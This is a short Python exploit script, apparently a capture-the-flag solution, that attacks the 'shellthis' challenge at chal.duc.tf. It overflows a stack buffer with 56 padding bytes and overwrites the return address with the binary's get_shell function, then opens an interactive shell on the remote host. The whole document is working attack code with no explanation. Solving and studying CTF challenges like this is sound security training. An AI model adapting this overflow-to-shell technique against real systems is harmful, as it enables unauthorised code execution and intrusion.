from roppy import *

p = remote("chal.duc.tf", 30002)
elf = ELF("shellthis")

payload = b"A"*56
payload += p64(elf.function("get_shell"))

p.sendlineafter(": ", payload)
p.interactive()
